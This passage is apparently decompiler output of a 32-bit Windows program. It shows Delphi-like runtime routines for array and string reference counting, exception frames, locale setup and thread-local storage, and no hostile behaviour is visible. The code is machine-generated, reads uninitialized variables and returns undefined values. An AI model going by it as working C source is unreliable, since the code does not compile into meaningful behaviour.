    int32_t result2 = result; // 0x403853
    if (v4 == 0) {
        // 0x403855
        result2 = function_402626();
    }
    // 0x403860
    return result2;
}

// Address range: 0x403866 - 0x40386b
int32_t function_403866(int32_t a1, int32_t a2, int32_t a3) {
    // 0x403866
    return function_403822();
}

// Address range: 0x40386b - 0x40386c
int32_t function_40386b(void) {
    // 0x40386b
    int32_t result; // 0x40386b
    return result;
}

// Address range: 0x40386e - 0x403873
int32_t function_40386e(void) {
    // 0x40386e
    return function_403822();
}

// Address range: 0x403873 - 0x403874
int32_t function_403873(void) {
    // 0x403873
    int32_t result; // 0x403873
    return result;
}

// Address range: 0x403876 - 0x4038b5
int32_t function_403876(int32_t * a1) {
    // 0x403876
    int32_t v1; // 0x403876
    if (v1 == 0) {
        // 0x4038b1
        return function_4034be();
    }
    int32_t v2 = *(int32_t *)(v1 - 4); // 0x40387b
    if (v2 == 0) {
        // 0x4038b1
        return function_4034be();
    }
    int32_t v3; // 0x403876
    int32_t v4; // 0x403876
    if (v3 < 1) {
        if (v4 < 0) {
            // 0x4038b1
            return function_4034be();
        }
        // 0x4038b1
        return function_403582();
    }
    if (v4 < 0 || v3 - 1 >= v2) {
        // 0x4038b1
        return function_4034be();
    }
    // 0x4038b1
    return function_403582();
}

// Address range: 0x4038b5 - 0x4038b6
int32_t function_4038b5(void) {
    // 0x4038b5
    int32_t result; // 0x4038b5
    return result;
}

// Address range: 0x4038b6 - 0x4038fe
int32_t function_4038b6(void) {
    // 0x4038b6
    int32_t v1; // 0x4038b6
    int32_t v2; // 0x4038b6
    int32_t v3; // 0x4038b6
    int32_t result = function_403866(v3, v2, v1); // 0x4038bf
    if (result == 0) {
        // 0x4038fa
        return 0;
    }
    // 0x4038ca
    int32_t v4; // 0x4038b6
    if (v4 < 1) {
        // 0x4038fa
        return result;
    }
    int32_t result2 = result; // 0x4038d2
    int32_t v5; // 0x4038b6
    if (!((v5 < 1 | *(int32_t *)(result - 4) <= v4 - 1))) {
        // 0x4038d8
        function_40270a();
        result2 = function_4039a2();
    }
    // 0x4038fa
    return result2;
}

// Address range: 0x4038fe - 0x403959
int32_t function_4038fe(void) {
    int32_t result = 0; // 0x403900
    int32_t v1; // 0x4038fe
    if (v1 != 0) {
        // 0x403902
        function_4039a2();
        function_40270a();
        result = function_40270a();
    }
    // 0x403958
    return result;
}

// Address range: 0x40395a - 0x40399f
int32_t function_40395a(void) {
    // 0x40395a
    int32_t v1; // 0x40395a
    int32_t v2; // 0x40395a
    if (v1 == 0 || v2 == 0) {
        // 0x403993
        return 0;
    }
    uint32_t v3 = *(int32_t *)(v1 - 4); // 0x403969
    int32_t v4 = *(int32_t *)(v2 - 4) - 1; // 0x403970
    if (v4 < 0 || v3 <= v4) {
        // 0x403993
        return 0;
    }
    // 0x40397a
    int32_t v5; // bp-16, 0x40395a
    int32_t v6 = &v5; // 0x40396c
    int32_t v7 = v3 - v4; // 0x403976
    bool v8; // 0x40395a
    int32_t v9 = v8 ? -1 : 1;
    int32_t * v10 = (int32_t *)(v6 - 4);
    bool v11 = v7 == 0; // 0x40395a
    int32_t v12 = v7; // 0x40395a
    int32_t v13 = v2 + 1; // 0x403987
    int32_t result; // 0x40395a
    while (true) {
        // 0x40397a
        int32_t v14; // 0x40395a
        int32_t v15 = v14;
        int32_t v16 = v15; // 0x40397a
        int32_t v17 = v12; // 0x40397a
        int32_t v18; // 0x40395a
        if (v12 == 0) {
            // ._crit_edge
            v18 = v15;
            v12 = 0;
            result = 0;
            if (!v11) {
                // break -> 0x403993
                break;
            }
        } else {
            int32_t v19 = v16 + v9; // 0x40397a
            int32_t v20 = v17 - 1; // 0x40397a
            v18 = v19;
            v12 = v20;
            while (*(char *)v16 != (char)v2) {
                // .lr.ph
                v16 = v19;
                result = 0;
                if (v20 == 0) {
                    return result;
                }
                v19 = v16 + v9;
                v20--;
                v18 = v19;
                v12 = v20;
            }
        }
        int32_t v21 = v18; // 0x403986
        *v10 = v13;
        *(int32_t *)(v6 - 8) = v21;
        int32_t v22 = v4; // 0x403984
        int32_t v23 = v21; // 0x403984
        if (v22 == 0) {
            // 0x403996
            result = v21 - v5;
            return result;
        }
        int32_t v24 = v13;
        char v25 = *(char *)v23; // 0x403984
        v22--;
        int32_t v26 = v24 + v9; // 0x403984
        v23 += v9;
        while (*(char *)v24 == v25) {
            if (v22 == 0) {
                // 0x403996
                result = v21 - v5;
                return result;
            }
            v24 = v26;
            v25 = *(char *)v23;
            v22--;
            v26 = v24 + v9;
            v23 += v9;
        }
        // 0x40398a
        v13 = *v10;
        v11 = false;
        v14 = v21;
    }
  lab_0x403993:
    // 0x403993
    return result;
}

// Address range: 0x4039a2 - 0x403a04
int32_t function_4039a2(void) {
    int32_t v1 = 0; // 0x4039ad
    uint32_t v2; // 0x4039a2
    int32_t v3; // 0x4039a2
    if (v2 >= 1) {
        if (v3 != 0) {
            // 0x4039b5
            if (*(int32_t *)(v3 - 8) == 1) {
                // 0x4039bb
                function_402646();
                *(char *)(v3 + v2) = 0;
                // 0x403a00
                int32_t result; // 0x4039a2
                return result;
            }
        }
        int32_t v4 = function_403556(); // 0x4039da
        v1 = 0;
        if (v4 != 0) {
            // 0x4039e7
            function_40270a();
            v1 = v4;
        }
    }
    int32_t result2 = function_4034be(); // 0x4039f9
    *(int32_t *)v3 = v1;
    // 0x403a00
    return result2;
}

// Address range: 0x403a06 - 0x403a0d
int32_t function_403a06(void) {
    // 0x403a06
    return function_4026ee((int32_t)&g117);
}

// Address range: 0x403a0d - 0x403a0e
int32_t function_403a0d(void) {
    // 0x403a0d
    int32_t result; // 0x403a0d
    return result;
}

// Address range: 0x403a0e - 0x403a23
int32_t function_403a0e(void) {
    // 0x403a0e
    int32_t result; // 0x403a0e
    if (result != 0) {
        // 0x403a14
        *(int32_t *)result = 0;
        SysFreeString((int16_t *)result);
    }
    // 0x403a22
    return result;
}

// Address range: 0x403a26 - 0x403a47
int32_t function_403a26(int32_t a1, int32_t a2, int32_t a3, int32_t a4) {
    // 0x403a26
    int32_t v1; // bp-8, 0x403a26
    int32_t v2 = &v1;
    int32_t v3; // 0x403a26
    int32_t * v4 = (int32_t *)v3; // 0x403a2c
    int32_t v5 = *v4; // 0x403a2c
    int32_t result = 0; // 0x403a30
    int32_t v6 = v2; // 0x403a30
    if (v5 != 0) {
        // 0x403a32
        *v4 = 0;
        v6 = v2 - 4;
        *(int32_t *)v6 = v5;
        SysFreeString((int16_t *)&g117);
        result = &g117;
    }
    // 0x403a3e
    int32_t v7; // 0x403a26
    int32_t v8 = v7 - 1; // 0x403a41
    v3 += 4;
    while (v8 != 0) {
        // 0x403a2c
        v2 = v6;
        v4 = (int32_t *)v3;
        v5 = *v4;
        result = 0;
        v6 = v2;
        if (v5 != 0) {
            // 0x403a32
            *v4 = 0;
            v6 = v2 - 4;
            *(int32_t *)v6 = v5;
            SysFreeString((int16_t *)&g117);
            result = &g117;
        }
        // 0x403a3e
        v8--;
        v3 += 4;
    }
    // 0x403a44
    return result;
}

// Address range: 0x403a4a - 0x403a6e
int32_t function_403a4a(void) {
    // 0x403a4a
    int32_t v1; // 0x403a4a
    int32_t v2; // 0x403a4a
    if (v2 == 0) {
        v1 = function_403a0e();
    }
    uint32_t v3 = *(int32_t *)(v2 - 4); // 0x403a52
    int32_t v4 = v1; // 0x403a57
    if (v3 < 2) {
        v4 = function_403a0e();
    }
    int32_t result = SysReAllocStringLen((int16_t **)(v3 / 2), (int16_t *)v2, v4); // 0x403a60
    if (result != 0) {
        // 0x403a6d
        return result;
    }
    function_403a06();
    // UNREACHABLE
}

// Address range: 0x403a6e - 0x403a9f
int32_t function_403a6e(void) {
    int32_t v1; // 0x403a6e
    for (uint32_t i = *(int32_t *)(v1 + 6 + (int32_t)*(char *)(v1 + 1)); i >= 1; i--) {
        // 0x403a80
        function_403aba();
    }
    // 0x403a99
    int32_t result; // 0x403a6e
    return result;
}

// Address range: 0x403aa2 - 0x403ab9
int32_t function_403aa2(void) {
    // 0x403aa2
    if (g12 != 0) {
        // 0x403aab
        int32_t result; // 0x403aa2
        return result;
    }
    // 0x403ab2
    function_4026ee((int32_t)&g117);
    // UNREACHABLE
}

// Address range: 0x403ab9 - 0x403aba
int32_t function_403ab9(void) {
    // 0x403ab9
    int32_t result; // 0x403ab9
    return result;
}

// Address range: 0x403aba - 0x403ba4
int32_t function_403aba(void) {
    // 0x403aba
    int32_t v1; // 0x403aba
    int32_t result; // 0x403aba
    if (v1 == 0) {
        // 0x403ba3
        return result;
    }
    int32_t v2; // 0x403aba
    switch ((char)v2) {
        case 10: {
            if (v1 > 1) {
                // 0x403b0e
                function_4034e2();
            } else {
                // 0x403b04
                function_4034be();
            }
            // 0x403ba3
            return result;
        }
        case 11: {
            if (v1 > 1) {
                // 0x403b28
                int32_t v3; // 0x403aba
                int32_t v4; // 0x403aba
                int32_t v5; // 0x403aba
                function_403a26(result, v5, v4, v3);
            } else {
                // 0x403b21
                function_403a0e();
            }
            // 0x403ba3
            return result;
        }
        case 12: {
            int32_t v6; // 0x403aba
            uint32_t v7 = v6;
            function_403aa2();
            v6 = v7 - 1;
            while (v7 > 1) {
                // 0x403b31
                v7 = v6;
                function_403aa2();
                v6 = v7 - 1;
            }
            // 0x403ba3
            return result;
        }
        case 13: {
            int32_t v8; // 0x403aba
            uint32_t v9 = v8;
            function_403aba();
            v8 = v9 - 1;
            while (v9 > 1) {
                // 0x403b43
                v9 = v8;
                function_403aba();
                v8 = v9 - 1;
            }
            // 0x403ba3
            return result;
        }
        case 14: {
            int32_t v10; // 0x403aba
            uint32_t v11 = v10;
            function_403a6e();
            v10 = v11 - 1;
            while (v11 > 1) {
                // 0x403b61
                v11 = v10;
                function_403a6e();
                v10 = v11 - 1;
            }
            // 0x403ba3
            return result;
        }
        case 15: {
            int32_t v12; // 0x403aba
            uint32_t v13 = v12;
            function_4040de();
            v12 = v13 - 1;
            while (v13 > 1) {
                // 0x403b74
                v13 = v12;
                function_4040de();
                v12 = v13 - 1;
            }
            // 0x403ba3
            return result;
        }
        case 17: {
            int32_t v14; // 0x403aba
            uint32_t v15 = v14;
            function_403f9e();
            v14 = v15 - 1;
            while (v15 > 1) {
                // 0x403b83
                v15 = v14;
                function_403f9e();
                v14 = v15 - 1;
            }
            // 0x403ba3
            return result;
        }
    }
    // 0x403b94
    function_4026ee(result);
    // UNREACHABLE
}

// Address range: 0x403ba6 - 0x403bbd
int32_t function_403ba6(void) {
    // 0x403ba6
    if (g13 != 0) {
        // 0x403baf
        int32_t result; // 0x403ba6
        return result;
    }
    // 0x403bb6
    function_4026ee((int32_t)&g117);
    // UNREACHABLE
}

// Address range: 0x403bbd - 0x403bbe
int32_t function_403bbd(void) {
    // 0x403bbd
    int32_t result; // 0x403bbd
    return result;
}

// Address range: 0x403bbe - 0x403cd8
int32_t function_403bbe(void) {
    // 0x403bbe
    int32_t v1; // 0x403bbe
    int32_t v2 = v1 + 10 + (int32_t)*(char *)(v1 + 1); // 0x403bcb
    int32_t v3 = *(int32_t *)(v2 - 8); // bp-20, 0x403bd7
    int32_t result = 0; // 0x403bd7
    int32_t v4 = &v3; // 0x403bd7
    int32_t v5 = *(int32_t *)(v2 - 4); // 0x403bd7
    int32_t v6 = v2; // 0x403bd7
    while (true) {
        int32_t v7 = v4;
        int32_t * v8 = (int32_t *)(v6 + 4); // 0x403bd8
        if (*v8 > result) {
            // 0x403bdf
            function_40270a();
        }
        int32_t v9 = *(int32_t *)*(int32_t *)v6; // 0x403bef
        int32_t v10; // 0x403bbe
        int32_t v11; // 0x403bbe
        switch (*(char *)v9) {
            case 10: {
                // 0x403c29
                function_403512();
                v10 = 4;
                v11 = v7;
                // break -> 0x403cb7
                break;
            }
            case 11: {
                // 0x403c3a
                function_403a4a();
                v10 = 4;
                v11 = v7;
                // break -> 0x403cb7
                break;
            }
            case 12: {
                // 0x403c4b
                function_403ba6();
                v10 = 16;
                v11 = v7;
                // break -> 0x403cb7
                break;
            }
            case 13: {
                int32_t v12 = (int32_t)*(char *)(v9 + 1); // 0x403c5e
                int32_t v13 = v7 - 4; // 0x403c61
                *(int32_t *)v13 = *(int32_t *)(v9 + 2 + v12);
                int32_t * v14 = (int32_t *)(v7 - 8); // 0x403c65
                *v14 = *(int32_t *)(v9 + v12 + 6);
                function_403cda((int32_t)&g117);
                v10 = *v14;
                v11 = v13;
                // break -> 0x403cb7
                break;
            }
            case 14: {
                int32_t * v15 = (int32_t *)(v7 - 4); // 0x403c85
                *v15 = *(int32_t *)(v9 + 2 + (int32_t)*(char *)(v9 + 1));
                function_403bbe();
                v10 = *v15;
                v11 = v7;
                // break -> 0x403cb7
                break;
            }
            case 15: {
                // 0x403c95
                function_4040f6();
                v10 = 4;
                v11 = v7;
                // break -> 0x403cb7
                break;
            }
            case 17: {
                // 0x403ca6
                function_403fda();
                v10 = 4;
                v11 = v7;
                // break -> 0x403cb7
                break;
            }
            default: {
                // 0x403c1e
                function_4026ee((int32_t)&g117);
                // UNREACHABLE
            }
        }
        // 0x403cb7
        v4 = v11;
        result = *v8 + v10;
        v5--;
        v6 += 8;
        if (v5 == 0) {
            // 0x403cc4
            if (*(int32_t *)v4 > result) {
                // 0x403cd3
                return function_40270a();
            }
            // 0x403cd3
            return result;
        }
    }
    // 0x403c1e
    function_4026ee((int32_t)&g117);
    // UNREACHABLE
}

// Address range: 0x403cda - 0x403dcc
int32_t function_403cda(int32_t a1) {
    int32_t v1 = a1; // 0x403d2f
    int32_t v2 = a1; // 0x403d46
    int32_t v3 = a1; // 0x403d5a
    int32_t v4 = a1; // 0x403d98
    int32_t v5 = a1; // 0x403dac
    int32_t v6 = a1; // 0x403dc2
    int32_t result; // 0x403cda
    int32_t result2; // 0x403d72
    int32_t v7; // 0x403cda
    switch ((char)v7) {
        case 10: {
            v1--;
            result = function_403512();
            while (v1 != 0) {
                // 0x403d20
                v1--;
                result = function_403512();
            }
            // 0x403dc5
            return result;
        }
        case 11: {
            v2--;
            result = function_403a4a();
            while (v2 != 0) {
                // 0x403d37
                v2--;
                result = function_403a4a();
            }
            // 0x403dc5
            return result;
        }
        case 12: {
            v3--;
            result = function_403ba6();
            while (v3 != 0) {
                // 0x403d4b
                v3--;
                result = function_403ba6();
            }
            // 0x403dc5
            return result;
        }
        case 13: {
            unsigned char v8 = *(char *)(v7 + 1); // 0x403d61
            int32_t v9; // bp-16, 0x403cda
            int32_t v10 = &v9; // 0x403d64
            int32_t v11 = a1; // 0x403d64
            v10 -= 4;
            *(int32_t *)v10 = *(int32_t *)(v7 + 6 + (int32_t)v8);
            result2 = function_403cda((int32_t)&g117);
            v11--;
            while (v11 != 0) {
                // 0x403d68
                v10 -= 4;
                *(int32_t *)v10 = *(int32_t *)(v7 + 6 + (int32_t)v8);
                result2 = function_403cda((int32_t)&g117);
                v11--;
            }
            // break -> 0x403dc5
            break;
        }
        case 14: {
            function_403bbe();
            v4--;
            while (v4 != 0) {
                // 0x403d80
                function_403bbe();
                v4--;
            }
            // 0x403dc5
            return (int32_t)*(char *)(v7 + 1);
        }
        case 15: {
            v5--;
            result = function_4040f6();
            while (v5 != 0) {
                // 0x403d9d
                v5--;
                result = function_4040f6();
            }
            // 0x403dc5
            return result;
        }
        case 17: {
            v6--;
            result = function_403fda();
            while (v6 != 0) {
                // 0x403db1
                v6--;
                result = function_403fda();
            }
            // 0x403dc5
            return result;
        }
        default: {
            // 0x403d15
            int32_t v12; // 0x403cda
            function_4026ee(v12);
            // UNREACHABLE
        }
    }
    // 0x403dc5
    return result2;
}

// Address range: 0x403dcc - 0x403dcd
int32_t function_403dcc(void) {
    // 0x403dcc
    int32_t result; // 0x403dcc
    return result;
}

// Address range: 0x403dce - 0x403dd5
int32_t function_403dce(void) {
    // 0x403dce
    return function_4026ee((int32_t)&g117);
}

// Address range: 0x403dd5 - 0x403dd6
int32_t function_403dd5(void) {
    // 0x403dd5
    int32_t result; // 0x403dd5
    return result;
}

// Address range: 0x403dd6 - 0x403dde
int32_t function_403dd6(void) {
    int32_t result = 0; // 0x403dd8
    int32_t v1; // 0x403dd6
    if (v1 != 0) {
        // 0x403dda
        result = *(int32_t *)(v1 - 4);
    }
    // 0x403ddd
    return result;
}

// Address range: 0x403dde - 0x403de5
int32_t function_403dde(void) {
    // 0x403dde
    return function_403dd6() - 1;
}

// Address range: 0x403de6 - 0x403df5
int32_t function_403de6(int32_t a1) {
    // 0x403de6
    int32_t v1; // 0x403de6
    return function_403cda(v1);
}

// Address range: 0x403df6 - 0x403dfb
int32_t function_403df6(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6, int32_t a7, int32_t a8, int32_t a9) {
    // 0x403df6
    return function_403aba();
}

// Address range: 0x403dfb - 0x403dfc
int32_t function_403dfb(void) {
    // 0x403dfb
    int32_t result; // 0x403dfb
    return result;
}

// Address range: 0x403dfe - 0x403e04
int32_t function_403dfe(int32_t a1, int32_t a2) {
    // 0x403dfe
    return function_403f9e();
}

// Address range: 0x403e06 - 0x403f92
int32_t function_403e06(int32_t a1) {
    int32_t v1 = *(int32_t *)a1; // 0x403e1f
    int32_t v2; // 0x403e06
    int32_t v3; // 0x403e06
    if (v1 >= 0 != v1 != 0) {
        if (v1 >= 0) {
            // 0x403f89
            return function_403dfe(v2, v3);
        }
        // 0x403e29
        function_4026ee(v2);
        // UNREACHABLE
    }
    int32_t v4 = 0; // 0x403e46
    int32_t v5 = 0; // 0x403e46
    int32_t v6; // 0x403e06
    if (v6 != 0) {
        // 0x403e48
        v4 = *(int32_t *)(v6 - 4);
        v5 = v6 - 8;
    }
    int32_t v7 = v4;
    int32_t v8; // 0x403e06
    int32_t v9 = v8 + (int32_t)*(char *)(v8 + 1); // 0x403e58
    int32_t v10 = *(int32_t *)(v9 + 2); // 0x403e5c
    int32_t v11 = *(int32_t *)(v9 + 6); // 0x403e62
    int32_t v12 = 0; // 0x403e67
    if (v11 != 0) {
        // 0x403e69
        v12 = *(int32_t *)v11;
    }
    int32_t v13 = v10 * v1; // 0x403e71
    if (v10 != (int32_t)((0x100000000 * (int64_t)(v13 >> 31) | (int64_t)v13) / (int64_t)v1)) {
        // 0x403e82
        function_4026ee(v2);
        // UNREACHABLE
    }
    // 0x403e89
    int32_t v14; // bp-48, 0x403e06
    int32_t v15 = &v14; // 0x403e0e
    int32_t v16; // 0x403e06
    int32_t v17; // 0x403e06
    if (v5 == 0) {
        goto lab_0x403e96;
    } else {
        int32_t * v18 = (int32_t *)v5; // 0x403e91
        int32_t v19 = *v18; // 0x403e91
        if (v19 != 1) {
            // 0x403ecb
            *v18 = v19 - 1;
            int32_t v20 = function_402606(); // 0x403ed0
            if (v12 == 0) {
                // 0x403f13
                function_40270a();
                v16 = v20;
                v17 = v15;
            } else {
                int32_t v21 = v1 < v7 ? v1 : v7;
                function_40286e();
                int32_t v22 = v21; // bp-52, 0x403eff
                function_403de6(v21);
                v16 = v20;
                v17 = &v22;
            }
            goto lab_0x403f29;
        } else {
            goto lab_0x403e96;
        }
    }
  lab_0x403e96:
    if (v1 < v7 && v12 != 0) {
        // 0x403ea2
        int32_t v23; // 0x403e06
        int32_t v24; // 0x403e06
        int32_t v25; // 0x403e06
        function_403df6(v2, v3, v7, v10, v13 + 8, v5, v25, v24, v23);
    }
    // 0x403ebb
    function_402646();
    v16 = v5;
    v17 = v15;
    goto lab_0x403f29;
  lab_0x403f29:
    // 0x403f29
    *(int32_t *)v16 = 1;
    *(int32_t *)(v16 + 4) = v1;
    function_40286e();
    int32_t result; // 0x403e06
    if (v3 < 2) {
        // 0x403f84
        *(int32_t *)v6 = v16 + 8;
        // 0x403f89
        return result;
    }
    int32_t v26 = 0; // 0x403f60
    if (v1 < 1) {
        // 0x403f84
        *(int32_t *)v6 = v16 + 8;
        // 0x403f89
        return result;
    }
    int32_t v27 = v17 - 4; // 0x403f6d
    *(int32_t *)v27 = a1 + 4;
    function_403e06(v26);
    int32_t v28 = v1 - 1; // 0x403f81
    v26++;
    int32_t v29 = v27; // 0x403f82
    int32_t v30 = v28; // 0x403f82
    while (v28 != 0) {
        // 0x403f6a
        v27 = v29 - 4;
        *(int32_t *)v27 = a1 + 4;
        function_403e06(v26);
        v28 = v30 - 1;
        v26++;
        v29 = v27;
        v30 = v28;
    }
    // 0x403f84
    *(int32_t *)v6 = v16 + 8;
    // 0x403f89
    return result;
}

// Address range: 0x403f92 - 0x403f9d
int32_t function_403f92(void) {
    // 0x403f92
    int32_t v1; // 0x403f92
    return function_403e06((int32_t)&v1 + 4);
}

// Address range: 0x403f9e - 0x403fd8
int32_t function_403f9e(void) {
    // 0x403f9e
    int32_t result; // 0x403f9e
    if (result == 0) {
        // 0x403fd7
        return result;
    }
    // 0x403fa4
    *(int32_t *)result = 0;
    int32_t * v1 = (int32_t *)(result - 8); // 0x403faa
    int32_t v2 = *v1 - 1; // 0x403faa
    *v1 = v2;
    if (v2 != 0) {
        // 0x403fd7
        return result;
    }
    // 0x403fb0
    int32_t v3; // 0x403f9e
    if (*(int32_t *)(v3 + 6 + (int32_t)*(char *)(v3 + 1)) != 0) {
        // 0x403fc0
        if (*(int32_t *)(result - 4) != 0) {
            // 0x403fc7
            function_403aba();
        }
    }
    // 0x403fce
    function_402626();
    // 0x403fd7
    return result;
}

// Address range: 0x403fda - 0x404001
int32_t function_403fda(void) {
    // 0x403fda
    int32_t v1; // 0x403fda
    if (v1 != 0) {
        int32_t * v2 = (int32_t *)(v1 - 8); // 0x403fe1
        *v2 = *v2 + 1;
    }
    int32_t result; // 0x403fda
    if (result == 0) {
        // 0x403ffd
        return result;
    }
    int32_t * v3 = (int32_t *)(result - 8); // 0x403fe9
    int32_t v4 = *v3; // 0x403fe9
    int32_t v5 = v4 - 1; // 0x403fe9
    *v3 = v5;
    if (v5 == 0) {
        // 0x403fef
        *v3 = v4;
        function_403f9e();
    }
    // 0x403ffd
    return result;
}

// Address range: 0x404002 - 0x40405c
int32_t function_404002(void) {
    // 0x404002
    if (g19 == 0) {
        // 0x404055
        return 0;
    }
    // 0x40401c
    int32_t v1; // bp-24, 0x404002
    int32_t v2 = &v1; // 0x40400a
    int32_t v3 = v2 - 12;
    int32_t * v4 = (int32_t *)v3;
    int32_t result = g19; // 0x40404a
    int32_t v5; // bp-4, 0x404002
    *(int32_t *)(v2 - 4) = (int32_t)&v5;
    *(int32_t *)(v2 - 8) = 0x40403d;
    *v4 = __readfsdword(0);
    __writefsdword(0, v3);
    __writefsdword(0, *v4);
    result = *(int32_t *)result;
    while (result != 0) {
        // 0x40401c
        *(int32_t *)(v2 - 4) = (int32_t)&v5;
        *(int32_t *)(v2 - 8) = 0x40403d;
        *v4 = __readfsdword(0);
        __writefsdword(0, v3);
        __writefsdword(0, *v4);
        result = *(int32_t *)result;
    }
    // 0x404055
    return result;
}

// Address range: 0x40405e - 0x40406c
int32_t function_40405e(void) {
    // 0x40405e
    int32_t result; // 0x40405e
    *(int32_t *)result = g18;
    return result;
}

// Address range: 0x40406e - 0x4040d2
int32_t function_40406e(void) {
    int32_t v1 = __readfsdword(0); // bp-20, 0x40407d
    __writefsdword(0, (int32_t)&v1);
    function_404002();
    __writefsdword(0, v1);
    int32_t result; // 0x40406e
    int32_t v2; // 0x40406e
    if (v2 == g18) {
        // 0x4040d1
        return result;
    }
    // 0x4040b2
    if (g18 == 0) {
        // 0x4040d1
        return 0;
    }
    int32_t result2 = g18;
    int32_t * v3 = (int32_t *)result2;
    int32_t v4 = *v3; // 0x4040bb
    while (v4 != v2) {
        // 0x4040cb
        result = v4;
        if (v4 == 0) {
            // 0x4040d1
            return result;
        }
        result2 = v4;
        v3 = (int32_t *)result2;
        v4 = *v3;
    }
    // 0x4040c2
    *v3 = result2;
    // 0x4040d1
    return result2;
}

// Address range: 0x4040d2 - 0x4040d7
int32_t function_4040d2(void) {
    // 0x4040d2
    return function_402ed2((int32_t)&g117, (int32_t)&g117);
}

// Address range: 0x4040d7 - 0x4040d9
int32_t function_4040d7(void) {
    // 0x4040d7
    int32_t result; // 0x4040d7
    return result;
}

// Address range: 0x4040d9 - 0x4040dc
int32_t function_4040d9(int32_t a1, int32_t a2) {
    // 0x4040d9
    int32_t result; // 0x4040d9
    return result;
}

// Address range: 0x4040de - 0x4040f3
int32_t function_4040de(void) {
    // 0x4040de
    int32_t result; // 0x4040de
    if (result != 0) {
        // 0x4040e4
        *(int32_t *)result = 0;
    }
    // 0x4040f2
    return result;
}

// Address range: 0x4040f6 - 0x404122
int32_t function_4040f6(void) {
    // 0x4040f6
    int32_t result; // 0x4040f6
    if (result != 0) {
        // 0x4040fa
        return result;
    }
    // 0x404113
    int32_t result2; // 0x4040f6
    *(int32_t *)result2 = 0;
    return result2;
}

// Address range: 0x404122 - 0x404188
int32_t function_404122(void) {
    int32_t v1 = __readfsdword(0); // bp-36, 0x404136
    __writefsdword(0, (int32_t)&v1);
    int32_t LCType; // bp-15, 0x404122
    int32_t cchData; // 0x404122
    GetLocaleInfoA(7, (int32_t)&LCType, (char *)0x1004, cchData);
    function_4035fe();
    function_4028fa();
    __writefsdword(0, cchData);
    return function_4034be();
}

// Address range: 0x404188 - 0x40418d
int32_t function_404188(void) {
    // 0x404188
    return function_402ed2((int32_t)&g117, (int32_t)&g117);
}

// Address range: 0x40418d - 0x40418f
int32_t function_40418d(void) {
    // 0x40418d
    int32_t result; // 0x40418d
    return result;
}

// Address range: 0x40418f - 0x404196
int32_t function_40418f(int32_t a1) {
    // 0x40418f
    int32_t result; // 0x40418f
    return result;
}

// Address range: 0x404196 - 0x4041e0
int32_t function_404196(void) {
    int32_t v1 = __readfsdword(0); // bp-16, 0x4041a1
    __writefsdword(0, (int32_t)&v1);
    int32_t v2 = g58 + 1; // 0x4041a7
    g58 = v2;
    if (v2 == 0) {
        // 0x4041af
        function_40278a();
        function_40278a();
        function_40278a();
        function_401a0a();
    }
    // 0x4041d2
    __writefsdword(0, v1);
    return 0;
}

// Address range: 0x4041e0 - 0x4041e5
int32_t function_4041e0(void) {
    // 0x4041e0
    return function_402ed2((int32_t)&g117, (int32_t)&g117);
}

// Address range: 0x4041e5 - 0x4041e7
int32_t function_4041e5(void) {
    // 0x4041e5
    int32_t result; // 0x4041e5
    return result;
}

// Address range: 0x4041e7 - 0x4041e9
int32_t function_4041e7(int32_t a1) {
    // 0x4041e7
    int32_t result; // 0x4041e7
    return result;
}

// Address range: 0x4041ea - 0x4042bd
int32_t function_4041ea(void) {
    int32_t v1 = g58; // 0x4041ea
    g58 = v1 - 1;
    if (v1 != 0) {
        // 0x4042bc
        int32_t result; // 0x4041ea
        return result;
    }
    // 0x4041f7
    *(char *)&g11 = 2;
    g41 = 0x4011b6;
    g42 = 0x4011be;
    *(char *)&g51 = 2;
    g39 = 0x403dce;
    if ((char)function_402a06() != 0) {
        // 0x40422c
        function_402a36();
    }
    // 0x404231
    *(int16_t *)&g53 = -0x2850;
    g54 = -0x2850;
    *(int16_t *)&g55 = -0x2850;
    g47 = (int32_t)GetCommandLineA();
    g46 = function_401256();
    if (GetVersion() < 0) {
        // 0x4042a3
        GetThreadLocale();
        g59 = function_404122();
    } else {
        // 0x404276
        if ((GetVersion() & 255) < 5) {
            // 0x404292
            GetThreadLocale();
            g59 = function_404122();
        } else {
            // 0x404286
            g59 = 3;
        }
    }
    int32_t threadId = GetCurrentThreadId(); // 0x4042b2
    g44 = threadId;
    // 0x4042bc
    return threadId;
}

// Address range: 0x4042be - 0x4042c4
int32_t * function_4042be(int32_t uFlags, int32_t uBytes) {
    // 0x4042be
    return LocalAlloc(uFlags, uBytes);
}

// Address range: 0x4042c6 - 0x4042cc
int32_t * function_4042c6(int32_t * hMem) {
    // 0x4042c6
    return LocalFree(hMem);
}

// Address range: 0x4042ce - 0x4042d4
int32_t function_4042ce(void) {
    // 0x4042ce
    return TlsAlloc();
}

// Address range: 0x4042d6 - 0x4042dc
bool function_4042d6(int32_t dwTlsIndex) {
    // 0x4042d6
    return TlsFree(dwTlsIndex);
}

// Address range: 0x4042de - 0x4042e4
int32_t * function_4042de(int32_t dwTlsIndex) {
    // 0x4042de
    return TlsGetValue(dwTlsIndex);
}

// Address range: 0x4042e6 - 0x4042ec
bool function_4042e6(int32_t dwTlsIndex, int32_t * lpTlsValue) {
    // 0x4042e6
    return TlsSetValue(dwTlsIndex, lpTlsValue);
}

// Address range: 0x4042ee - 0x4042f7
int32_t function_4042ee(void) {
    // 0x4042ee
    int32_t uFlags; // 0x4042ee
    return (int32_t)LocalAlloc(uFlags, 64);
}

// Address range: 0x4042fa - 0x404300
int32_t function_4042fa(int32_t a1) {
    // 0x4042fa
    return 8;
}

// Address range: 0x404302 - 0x404346
int32_t function_404302(void) {
    // 0x404302
    int32_t v1; // 0x404302
    if (function_4042fa(v1) == 0) {
        // 0x404344
        return 0;
    }
    // 0x40430e
    if (g21 == -1) {
        // 0x404317
        function_4034b2((int32_t)&g117);
        // UNREACHABLE
    }
    int32_t dwTlsIndex = function_4042ee(); // 0x404323
    if (dwTlsIndex != 0) {
        // 0x404344
        return TlsSetValue(dwTlsIndex, (int32_t *)g21);
    }
    // 0x40432c
    function_4034b2((int32_t)&g117);
    // UNREACHABLE
}

// Address range: 0x404346 - 0x40436f
int32_t function_404346(void) {
    // 0x404346
    g21 = TlsAlloc();
    function_404302();
    int32_t result = (int32_t)TlsGetValue(g21); // 0x404364
    g84 = result;
    return result;
}

// Address range: 0x404372 - 0x40439a
int32_t function_404372(void) {
    // 0x404372
    if (g21 == -1) {
        // 0x404399
        return 8;
    }
    int32_t * hMem = TlsGetValue(g21); // 0x40438a
    int32_t result = (int32_t)hMem; // 0x404391
    if (hMem != NULL) {
        // 0x404393
        result = (int32_t)LocalFree(hMem);
    }
